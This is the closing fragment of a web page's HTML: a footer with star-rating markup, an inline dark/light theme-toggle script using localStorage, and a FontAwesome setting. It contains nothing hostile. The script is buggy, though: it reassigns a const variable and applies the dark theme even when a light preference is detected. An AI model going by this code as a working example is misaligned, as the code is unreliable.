        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');
if (theme === 'undefined') {
   theme = "dark";
}
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
} else {
    document.documentElement.setAttribute('data-theme', 'light');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
